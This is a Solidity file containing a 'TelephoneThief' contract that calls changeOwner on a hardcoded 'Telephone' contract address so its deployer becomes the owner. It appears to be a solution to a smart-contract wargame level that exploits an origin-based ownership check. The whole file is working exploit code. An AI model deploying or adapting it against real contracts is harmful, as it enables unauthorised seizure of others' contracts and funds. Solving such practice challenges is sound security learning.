// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.0 <0.9.0;

contract Telephone {
    function changeOwner(address) public {}
    
    function owner() public pure returns (address) {}
}

contract TelephoneThief {
    
    Telephone telephoneContract;
    address TELEPHONE_CONTRACT_ADDRESS = 0x4Ba1E9714060e33Ef2EB54dF42B31B6994c02904;
    address owner;
    
    constructor() {
        telephoneContract = Telephone(TELEPHONE_CONTRACT_ADDRESS);
        owner = msg.sender;
    }
    
    function changeTelephoneContractAddress(address _newContractAddress) public {
        require(msg.sender == owner);
        telephoneContract = Telephone(_newContractAddress);
    }
    
    function takeOverTelephoneContract() public {
        require(msg.sender == owner);
        telephoneContract.changeOwner(msg.sender);
    }
}